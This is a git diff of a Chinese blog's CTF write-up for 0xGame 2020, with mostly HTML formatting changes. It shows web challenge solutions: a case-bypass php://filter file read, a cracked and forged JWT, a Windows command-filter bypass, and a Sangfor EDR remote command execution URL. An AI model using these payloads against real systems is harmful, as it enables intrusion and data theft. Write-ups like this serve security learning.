@@ -524,8 +524,7 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="前言">前言</h2>
-<p>南邮的师傅们整了个 0xGame，比赛持续了一个月，每周放出一定的题目。</p>
+                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>南邮的师傅们整了个 0xGame，比赛持续了一个月，每周放出一定的题目。</p>
 <p>大概看了看，题目还是有点意思的。</p>
 <blockquote>
 <p>比赛平台：<a target="_blank" rel="noopener" href="http://game.0xctf.com/">http://game.0xctf.com/</a></p>
@@ -535,9 +534,7 @@
 <p><em>（由于比较懒就没怎么写 WP，写的也比较简略</em></p>
 <p>嘤嘤嘤（跑</p>
 <hr>
-<h2 id="Week-4">Week 4</h2>
-<h3 id="Web-switch">Web_switch</h3>
-<blockquote>
+<h2 id="Week-4"><a href="#Week-4" class="headerlink" title="Week 4"></a>Week 4</h2><h3 id="Web-switch"><a href="#Web-switch" class="headerlink" title="Web_switch"></a>Web_switch</h3><blockquote>
 <p>小明在使用vim时电脑死机了，但是他写的代码还没有保存，这可怎么办呢？</p>
 <p><a target="_blank" rel="noopener" href="http://web.game.0xctf.com:30103/">http://web.game.0xctf.com:30103/</a></p>
 </blockquote>
@@ -574,18 +571,17 @@
 <p>虽然过滤了<code>filter|base64</code>，但匹配时没有不区分大小写，而 PHP 对大小写不敏感，于是改个大小写就完事了。</p>
 <p>payload:</p>
 <pre class="line-numbers language-none"><code class="language-none">id=2sdf&amp;file=php://filTer/read=convert.basE64-encode/resource=flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>得到</p>
+<p>得到 </p>
 <pre class="line-numbers language-none"><code class="language-none">PD9waHANCiRmbGFnPScweEdhbWV7UzBtZV9wSHBfdFIxY0tzX3VfRzN0XzF0fSc7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>base64decode</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token variable">$flag</span><span class="token operator">=</span><span class="token string single-quoted-string">'0xGame{S0me_pHp_tR1cKs_u_G3t_1t}'</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p>get!</p>
-<h3 id="Web-broken-motto">Web_broken_motto</h3>
-<blockquote>
+<h3 id="Web-broken-motto"><a href="#Web-broken-motto" class="headerlink" title="Web_broken_motto"></a>Web_broken_motto</h3><blockquote>
 <ul>
 <li>motto为啥查看不了了啊？</li>
 <li>Hint：注意查看注释的地方，注释前后有什么区别</li>
-<li><a target="_blank" rel="noopener" href="http://web.game.0xctf.com:30060">题目地址</a></li>
+<li><a target="_blank" rel="noopener" href="http://web.game.0xctf.com:30060/">题目地址</a></li>
 </ul>
 </blockquote>
 <p><strong>现学现卖的一题，顺便来总结了一下相关的知识点，PHP 太奇妙了真的。</strong></p>
@@ -761,19 +757,17 @@ xxxxx
 <p>再利用 <code>file_get_contents</code> 结合当前路径读取文件即可。</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="/2020/11/05/CTF_2020_0xGame/image-20201028180841912.png" alt="read flag"></p>
-<h3 id="Web-JWT">Web_JWT</h3>
-<p><a target="_blank" rel="noopener" href="http://web.game.0xctf.com:30107/">http://web.game.0xctf.com:30107/</a></p>
+<h3 id="Web-JWT"><a href="#Web-JWT" class="headerlink" title="Web_JWT"></a>Web_JWT</h3><p><a target="_blank" rel="noopener" href="http://web.game.0xctf.com:30107/">http://web.game.0xctf.com:30107/</a></p>
 <p><img src="/2020/11/05/CTF_2020_0xGame/image-20201028000841267.png" alt="login"></p>
 <p>随意输入用户名密码去登录，根据返回的 cookie 得到 JWT (JSON Web Token)。</p>
 <p>参考之前的 <a href="https://miaotony.xyz/2020/05/30/CTF_2020NUAACTF/#web2-jwt">NUAACTF web2-jwt</a>，利用 <a target="_blank" rel="noopener" href="https://github.com/brendan-rius/c-jwt-cracker"><strong>c-jwt-cracker</strong></a> 跑出 secret。</p>
 <p><img src="/2020/11/05/CTF_2020_0xGame/image-20201028001232047.png" alt="secret"></p>
 <p>secret 即 <code>njupt</code>。</p>
-<p>拿去 <a target="_blank" rel="noopener" href="http://jwt.io">jwt.io</a> 加密一下就好了，然后改掉 payload 里的 <code>role</code> 为 <code>admin</code>。</p>
+<p>拿去 jwt.io 加密一下就好了，然后改掉 payload 里的 <code>role</code> 为 <code>admin</code>。</p>
 <p><img src="/2020/11/05/CTF_2020_0xGame/image-20201028001342451.png" alt="jwt"></p>
 <p>最后把 cookie 改成 Encoded 里的那个就完事了。</p>
 <p><img src="/2020/11/05/CTF_2020_0xGame/image-20201028001502881.png" alt="flag"></p>
-<h3 id="Web-easyPython">Web_easyPython</h3>
-<blockquote>
+<h3 id="Web-easyPython"><a href="#Web-easyPython" class="headerlink" title="Web_easyPython"></a>Web_easyPython</h3><blockquote>
 <ul>
 <li>人生苦短，我用Python</li>
 <li>登录admin</li>
@@ -830,12 +824,11 @@ payload_64 <span class="token operator">=</span> base64<span class="token punctu
 <p><img src="/2020/11/05/CTF_2020_0xGame/image-20201106000045787.png" alt="payload"></p>
 <p>修改 Cookies，在 VPS 上接收一下，拿到 flag。</p>
 <p><img src="/2020/11/05/CTF_2020_0xGame/image-20201106000321983.png" alt="flag"></p>
-<h3 id="Misc-flip">Misc_flip</h3>
-<p><code>pwd.mp3</code> 一听就是电报了，老摩斯了。</p>
+<h3 id="Misc-flip"><a href="#Misc-flip" class="headerlink" title="Misc_flip"></a>Misc_flip</h3><p><code>pwd.mp3</code> 一听就是电报了，老摩斯了。</p>
 <p><img src="/2020/11/05/CTF_2020_0xGame/image-20201028161431879.png" alt="Morse Code"></p>
 <p>读出来是</p>
 <pre class="line-numbers language-none"><code class="language-none">....- ----- ----- ---.. ..... -.... -.... ----. ----. ...-- ----- ----- ... .. -.. .-. --- .-- ... ... .- .--.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>解码得到</p>
+<p> 解码得到</p>
 <pre class="line-numbers language-none"><code class="language-none">400856699300SIDROWSSAP<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>一看就是倒过来了的，那就倒回去。</p>
 <pre class="line-numbers language-none"><code class="language-none">PASSWORDIS003996658004<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -878,26 +871,22 @@ pwd<span class="token operator">=</span><span class="token string">''</span>
 <p>扫码得到 <a target="_blank" rel="noopener" href="http://am473ur.com/0xgame/flip/bd055250d3906d1f791d8e83b4396893.php">http://am473ur.com/0xgame/flip/bd055250d3906d1f791d8e83b4396893.php</a></p>
 <p><code>0xGame{b07906f9-f6f5-4120-9f80-01d761c8602e}</code></p>
 <p><em>老套娃了（</em></p>
-<h3 id="Misc-Hex酱">Misc_Hex酱</h3>
-<p>发现过滤的关键字其实只是命令里包含相应的字符而已，大写绕过就完事了~</p>
+<h3 id="Misc-Hex酱"><a href="#Misc-Hex酱" class="headerlink" title="Misc_Hex酱"></a>Misc_Hex酱</h3><p>发现过滤的关键字其实只是命令里包含相应的字符而已，大写绕过就完事了~</p>
 <p>不过还是日了一个晚上（（</p>
 <p>之前还没怎么在 Windows 下整命令行，这次还特地去查了一番。</p>
 <p>最开始还是绕了一大弯，本来不知道 flag 在哪，找了半天突然想到应该就在桌面上了。</p>
 <p>当前路径是  <code>C:\Users\Administrator\Desktop\Game\HexQBot</code></p>
 <p>通过环境变量和通配符，复制再读取 flag。</p>
-<p><img src="/2020/11/05/CTF_2020_0xGame/image-20201027000235458.png" alt=""></p>
+<p><img src="/2020/11/05/CTF_2020_0xGame/image-20201027000235458.png"></p>
 <p>后来突然想到不用这么复杂，直接读就完事了。</p>
 <p><img src="/2020/11/05/CTF_2020_0xGame/image-20201027000757009.png" alt="flag"></p>
 <p>后面问了出题的 Am473ur 师傅，这个返回内容的长度有了限制，所以有的指令发过去没有返回了。</p>
 <p>另外这个 Hex酱 挺容易崩的，心疼一下运维师傅（</p>
 <hr>
-<h2 id="Week-3">Week 3</h2>
-<p>之前几周懒了，就随便看看题做做题，<strong>基本没写 WP</strong>，就这样8.</p>
-<h3 id="Web-intval">Web_intval</h3>
-<p><strong>payload:</strong></p>
+<h2 id="Week-3"><a href="#Week-3" class="headerlink" title="Week 3"></a>Week 3</h2><p>之前几周懒了，就随便看看题做做题，<strong>基本没写 WP</strong>，就这样8.</p>
+<h3 id="Web-intval"><a href="#Web-intval" class="headerlink" title="Web_intval"></a>Web_intval</h3><p><strong>payload:</strong></p>
 <blockquote>
-<p><a target="_blank" rel="noopener" href="http://web.game.0xctf.com:30102/?0xGame=20201001%0a&amp;id=1024.3">http://web.game.0xctf.com:30102/?0xGame=20201001
-&amp;id=1024.3</a></p>
+<p><a target="_blank" rel="noopener" href="http://web.game.0xctf.com:30102/?0xGame=20201001%0A&amp;id=1024.3">http://web.game.0xctf.com:30102/?0xGame=20201001%0a&amp;id=1024.3</a></p>
 </blockquote>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -920,18 +909,18 @@ pwd<span class="token operator">=</span><span class="token string">''</span>
 Good job<span class="token operator">!</span>
 Congratulations<span class="token operator">!</span>
 <span class="token number">0</span>xGame<span class="token punctuation">{</span><span class="token number">947</span>eae96fe415cbc6eab176f15dd98b1<span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h3 id="Web-edr">Web_edr</h3>
-<p><strong>深信服 RCE</strong></p>
+
+
+<h3 id="Web-edr"><a href="#Web-edr" class="headerlink" title="Web_edr"></a>Web_edr</h3><p><strong>深信服 RCE</strong></p>
 <p>参考：</p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_37602797/article/details/108068122">https://blog.csdn.net/qq_37602797/article/details/108068122</a></p>
 <p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/4VtJ_M0c5GZsV4CmBr9CsQ">https://mp.weixin.qq.com/s/4VtJ_M0c5GZsV4CmBr9CsQ</a></p>
 <p><strong>payload:</strong></p>
 <blockquote>
-<p><a target="_blank" rel="noopener" href="http://web1.game.0xctf.com:40000/?strip_slashes=system&amp;host=cat%20/flag">http://web1.game.0xctf.com:40000/?strip_slashes=system&amp;host=cat /flag</a></p>
+<p><a target="_blank" rel="noopener" href="http://web1.game.0xctf.com:40000/?strip_slashes=system&amp;host=cat%20/flag">http://web1.game.0xctf.com:40000/?strip_slashes=system&amp;host=cat%20/flag</a></p>
 </blockquote>
 <p><code>0xGame{S4n9f0r_3dR_c4N_Rce_reC3n7_D4y}</code></p>
-<h2 id="小结">小结</h2>
-<p>还是挺有意思的。</p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>还是挺有意思的。</p>
 <p><em>（首尾呼应</em></p>
 <p>（溜了喵</p>
 
@@ -1485,7 +1474,7 @@ Congratulations<span class="token operator">!</span>
             |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
             <br>
                         &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">308.3k</span>&nbsp;字
+                class="white-color">308.1k</span>&nbsp;字
                                                                                     <span id="busuanzi_container_site_pv">
 			|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
                     class="white-color"></span>&nbsp;次
